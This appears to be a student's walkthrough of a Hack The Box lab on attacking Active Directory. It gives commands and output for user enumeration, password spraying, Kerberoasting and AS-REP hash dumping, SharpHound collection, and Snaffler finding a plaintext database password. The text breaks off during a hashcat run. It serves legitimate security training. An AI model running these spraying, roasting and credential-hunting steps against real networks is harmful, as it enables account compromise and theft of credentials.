|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: 24
  min_pw_length: 8
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: true
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: 5
domain_logoff_information:
  force_logoff_time: not set

Completed after 5.44 seconds
```

**Answer:** `8`

---
## Password Spraying - Making a Target User List
### Question:
![](./attachments/Pasted%20image%2020230228121502.png)

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/28/23 - Ronnie Flathers @ropnop

2023/02/28 06:14:22 >  Using KDC(s):
2023/02/28 06:14:22 >  	172.16.5.5:88

2023/02/28 06:14:22 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2023/02/28 06:14:22 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:6c1046a0dd4e9ade9a71539bda2bfdb9$4d0d08ac430536554cdb747b77674367656af05f0ce027ff508505102734665dd84ecdb6105856f5e33be840b7d8e1db99d9ef6dbeb67efb57b2297472b8096015cdb27f4598119c9a23e136a258507d2a8a352fa18dc9a89cd0049aa816f142acae208017ec11ae8a10b187e64060411c6b7e15b00ab6806b13bc9885dbafbd7de666400f853b2086dc7776aca513c446ebe608428cc1aaae6cabb4d64b0cac089a36bf77a836d13e5e384ed472794722aea86bddc974ee1c0e74be261ed49c5a8a0995bb1a44227dc4dab809c42400006c459150b348b28490b1c79a850cb16ede3125dcd2fac57ff43a5d2fb7600274f6d9dd6b2e67d42b181017d667d4a409e6b14adec88e4c73a2
2023/02/28 06:14:22 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2023/02/28 06:14:23 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
(...)
2023/02/28 06:14:35 >  Done! Tested 48705 usernames (56 valid) in 12.860 seconds
```

**Answer:** `56`

---
## Internal Password Spraying - from Linux
### Question:
![](./attachments/Pasted%20image%2020230228122743.png)

Create `validusers.txt` file.

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | grep @in | cut -f8 -d" " | cut -d '@' -f1  > validusers.txt
```

`Bash one-liner`.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $for u in $(cat validusers.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
Account Name: mholliday, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

When using `Kerbrute` certain users will trigger a `kdc_error`. They need to be removed from the list.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validusers.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/28/23 - Ronnie Flathers @ropnop

2023/02/28 12:56:34 >  Using KDC(s):
2023/02/28 12:56:34 >  	172.16.5.5:88

2023/02/28 12:56:34 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2023/02/28 12:56:34 >  Done! Tested 27 logins (1 successes) in 0.088 seconds
```

`CrackMapExec`.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo crackmapexec smb 172.16.5.5 -u validusers.txt -p Welcome1 --continue-on-success | grep +
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\mholliday:Welcome1 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

**Answer:** `sgage`

---
## Internal Password Spraying - from Windows
### Question:
![](./attachments/Pasted%20image%2020230228185918.png)

```
PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 10:48 AM
[*] Writing successes to spray_success
[*] SUCCESS! User:dbranch Password:Winter2022
133 of 2940 users tested
```

User:pass `dbranch:Winter2022`

**Answer:** `dbranch`

---
## Credentialed Enumeration - from Linux
### Question:
![](./attachments/Pasted%20image%2020230301094318.png)
*Hint: Convert the decimal value to the standard RID numbering scheme, then match to a user.*

Convert 1170 to hex.

![](./attachments/Pasted%20image%2020230301094456.png)

Start a RPCClient NULL session and `queryuser` with the hex value.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $rpcclient -U "" -N 172.16.5.5
rpcclient $> queryuser 0x492
	User Name   :	mmorgan
	Full Name   :	Matthew Morgan
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 10 Mar 2022 14:48:06 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Tue, 05 Apr 2022 15:34:55 EDT
	Password can change Time :	Wed, 06 Apr 2022 15:34:55 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x492
	group_rid:	0x201
	acb_info :	0x00010210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000018
	padding1[0..7]...
	logon_hrs[0..21]...
```

**Answer:** `mmorgan`

### Question:
![](./attachments/Pasted%20image%2020230301094328.png)
*Hint: Submit the number in decimal format.*

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10
```

**Answer:** `10`

---
## Credentialed Enumeration - from Windows
### Question:
![](./attachments/Pasted%20image%2020230301095117.png)

Run `SharpHound.exe` to gather domain information and save it in a `.zip` file.

```
PS C:\Tools> .\SharpHound.exe -c All --zipfilename inlanefreight
2023-03-01T02:06:51.3798174-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-01T02:06:51.3953825-08:00|INFORMATION|Initializing SharpHound at 2:06 AM on 3/1/2023
2023-03-01T02:06:51.6453709-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-01T02:06:51.9579016-08:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2023-03-01T02:07:22.9578996-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 66 MB RAM
2023-03-01T02:07:43.0516317-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-03-01T02:07:43.0516317-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-03-01T02:07:52.9736275-08:00|INFORMATION|Status: 3793 objects finished (+3793 62.18033)/s -- Using 123 MB RAM
2023-03-01T02:08:07.2392071-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-03-01T02:08:07.2860086-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-03-01T02:08:07.4266359-08:00|INFORMATION|Status: 3809 objects finished (+16 50.78667)/s -- Using 79 MB RAM
2023-03-01T02:08:07.4266359-08:00|INFORMATION|Enumeration finished in 00:01:15.4776658
2023-03-01T02:08:07.8797623-08:00|INFORMATION|SharpHound Enumeration Completed at 2:08 AM on 3/1/2023! Happy Graphing!
```

Import it into BloodHound by clicking the `upload` button.

![](./attachments/Pasted%20image%2020230301112229.png)

Type "Domain:" in the seach bar and select `INLANEFREIGHT.LOCAL`.

![](./attachments/Pasted%20image%2020230301112310.png)

Click on the "Analysis" tab and then click "List all Kerberoastable Accounts".

![](./attachments/Pasted%20image%2020230301112513.png)

Count the nodes.

**Answer:** `13`

### Question:
![](./attachments/Pasted%20image%2020230301095134.png)

"`Test-AdminAccess` - Tests if the current user has administrative access to the local (or a remote) machine"

**Answer:** `Test-AdminAccess`

### Question:
![](./attachments/Pasted%20image%2020230301095142.png)

Run `Snaffler.exe`.

```
PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2023-03-01 02:14:12 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2023-03-01 02:14:12 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2023-03-01 02:14:12 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2023-03-01 02:14:12 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2023-03-01 02:14:12 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.vhdx$|282B|3/31/2022 12:05:07 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\DB01-BACKUP.vhdx) .vhdx
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.ova$|306B|3/31/2022 12:08:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\NewCopy.ova) .ova
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.wim$|289B|3/31/2022 12:09:38 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\NewOptimize.wim) .wim
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.ovpn$|288B|3/31/2022 12:05:20 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\StepSync.ovpn) .ovpn
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.pcap$|279B|3/31/2022 12:04:55 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\UnprotectRestart.pcap) .pcap
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.vhdx$|285B|3/31/2022 12:09:11 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\WEB01-OLD.vhdx) .vhdx
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.psafe3$|275B|3/31/2022 12:08:50 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RedoPop.psafe3) .psafe3
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.cscfg$|309B|3/31/2022 12:04:57 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RequestUnprotect.cscfg) .cscfg
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|318B|3/31/2022 12:09:01 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ResolveExpand.sqldump) .sqldump
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|302B|3/31/2022 12:08:58 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RestoreCopy.sqldump) .sqldump
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|301B|3/31/2022 12:05:15 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\SubmitConvertFrom.tblk) .tblk
2023-03-01 02:14:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.psafe3$|305B|3/31/2022 12:09:41 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\WriteStart.psafe3) .psafe3
2023-03-01 02:14:38 -08:00 [File] {Red}<KeepConfigRegexRed|RW|connectionstring[[:space:]]*=[[:space:]]*[\'\"][^\'\"].....*|253B|3/31/2022 12:12:43 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\web.config) <?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="myConnectionString" connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
  </connectionStrings>
</configuration>
Press any key to exit.
```

At the end of the output we can see that `Snaffler` found a `web.config` file that contains `UID = sa`.

**Answer:** `sa`

### Question:
![](./attachments/Pasted%20image%2020230301095157.png)

In the output from `Snaffler` in the previous question we can see that the password of the database user (`sa`) is `ILFREIGHTDB01!`. 

**Answer:** `ILFREIGHTDB01!`

---
## Living Off the Land
### Question 1:
![](./attachments/Pasted%20image%2020230301122048.png)

Run `PowerShell` command `Get-MpComputerStatus`.

```
PS C:\Windows\system32> Get-MpComputerStatus

AMEngineVersion                 : 0.0.0.0
AMProductVersion                : 4.18.2109.6
AMRunningMode                   : Not running
AMServiceEnabled                : False
AMServiceVersion                : 0.0.0.0
AntispywareEnabled              : False
AntispywareSignatureAge         : 4294967295
AntispywareSignatureLastUpdated :
AntispywareSignatureVersion     : 0.0.0.0
AntivirusEnabled                : False
AntivirusSignatureAge           : 4294967295
AntivirusSignatureLastUpdated   :
AntivirusSignatureVersion       : 0.0.0.0
BehaviorMonitorEnabled          : False
ComputerID                      : 077DD3DD-5AF2-43E2-900E-D8B5FF616DFA
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
IsTamperProtected               : False
IsVirtualMachine                : True
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
TamperProtectionSource          : N/A
TDTMode                         : N/A
TDTStatus                       : N/A
TDTTelemetry                    : N/A
PSComputerName                  :
```

**Answer:** `4.18.2109.6`

### Question 2:
![](./attachments/Pasted%20image%2020230301122056.png)

Run `PowerShell` command `net localgroup Administrators`.

```
PS C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.
```

**Answer:** `adunn`

### Question 3:
![](./attachments/Pasted%20image%2020230301122104.png)
*Hint: We would need to filter on multiple attributes. we can do so with DSQuery & ldap filters.*

```
PS C:\Windows\system32> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -attr distinguishedName Description
  distinguishedName                                                                                   Description
  CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                                 Key Distribution Center Service Account
  CN=Jessica Msexchapproval 1F05a927-3Be2-4Fb9-Aa03-B59fe3b56f4c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Systemmailbox Bb558c35-97F1-4Cb9-8Ff7-D53741dc928c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Msexchdiscovery E0dc1c29-89C3-4034-B678-E6c29d823ed9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Msexchdiscoverymailbox D919ba05-46A6-415F-80Ad-7E09334bb852,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Migration.8F3e7716-2011-43E4-96B1-Aba62d229136,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Federatedemail.4C1f4d8b-8179-4148-93Bf-00A95fa1e042,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Systemmailbox{D0e409a0-Af9b-4720-92Fe-Aac869b0d201},CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Systemmailbox{2Ce34405-31Be-455D-89D7-A7c7da7a0daa},CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
  CN=Betty Ross,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                    HTB{LD@P_I$_W1ld}
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                                  Built-in account for guest access to the computer/domain
```

**Answer:** `HTB{LD@P_I$_W1ld}`

---
## Kerberoasting - from Linux
### Question 1:
![](./attachments/Pasted%20image%2020230301200154.png)

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2022-04-18 21:20:32.090310             
sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>                                

(...)
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$4ba7e2030bf694e5150ea9614802e6c6$ee35b683eff8a2e43251bc418e9787c354b76463c2a6579d4865fee8813e9f53e0fe072756e88dd0c24c686182af6f52b427dd7dc2feb00289e3afd5458b05cbc7abf54333101ded8170c88f0653c0c3af292e4dc01f0a1588637451b3399a236d0489dbfab1aa8aad5970d31b81ae75b6970c377111108d2f52f05ecf008d68e0590934745fdcb09e528cfe896f74810dd5e79a3e53603bc59899b14c77a691c1d2c93cf07454c2132cd22b34c2670e449e910281e5cd99294d170a8eb06dbce77ca4fc7f5ff4ca90963baf12d79aa787afca5fa1d9229486e13bf1a862e7ec711f534f6d867ffb09bccc657e867ff2f5a4f66ac7a1b6b8adf3dac6522af67c984e462f9a2abb201b2494a469183c635431dbe4245fbdfff8eedc348d45ca2b9fe4205f9c3fb49b2c9e035ff4066f15e7cc0be3b168eea06b7997990a68ec6c7f98f4fa38950b56ba75ef0fc7dfed13137199b114a49623c9c7a5c01ebf809f9a7aa708f2186c864afd32a5c4e1b0b1e3f48236579751a33a688872e613e5fdff52625acaa5fa35ef7c56158a023244b9ce67076c17e9c3ce6f926d4619718a90b6094fadc0751df2d85c5cdca842285c8b6aaea21a2dc820814c6298ac20ecae02197de7ec048815abe4c44846cd62c2463f2fbc071ded368704190f7139c028a13f71ad0c4f748c1771ee6f36eb6f943d67e32382f33f4aca394cfe1a3ca008b0bef50ffc28b63509f16e8aaff7a2056b3cfe16b86c3cd4e3fdd433d20bf6d87bed3c6f2a569a80759485c412b28a6d808b30073a853db0c8fca4feb337dd7f9fa747caaa1129a9fa80609024111e2810812e8be051cf0fb4aabd0f61eeae28a6da44a0ee333417a8a7c1639df0a27d8a118a0f7a26162c0c998a9c658bfe7bcb7bb21d0e9fb72fc0d01cd2f5f4caeda0c3580420d26b1f3790dfceee05c297656b4befc8a4b74dcc4d420a5f11b72ac6e4f7f71b867e8f151be594f94675e4823e4ebef8d9c9d5ac2e40b9f23b625410d8d04dc9881730ffe84a0f06a9b972f6449438d826ed6c347d56bae8af3328c00864f8afba7a53e1561937f70d83a8f0bd43f92e5ab5ba166290ff6b3f855e0ab8999b9b7b30184705b9a225b1bf2881c385397603888278fbd2cb059db655be3a4e5782340abb5824321aa48cecc2b1a01752a5c4c7d83030bd5fb24b3d194d9286665285a4338e336a1a33af42e731e144a10ed9714fd9d14c8fadfc9a955985fdb560c2386521c66fa8760dcb3f3fcaaf9d7e6bd0cb80c8c19a620229fe685065499013dd2087c0537a504e426a36e5b7dc41d1b3a5a056318f13d9cddf4691273bb29b33dd7aa97f676725cecdacb910db8f94b890adee28ae4341c480a8dbfc90c32c0cd589ac4e7ae13465badced24b0ae24fd033d8fdc6d97b1f077c2
```

Paste the hash into a file (`SAPSservice_tgs.hash`) with nano and start cracking it with `hashcat`.

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 SAPSservice_tgs.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

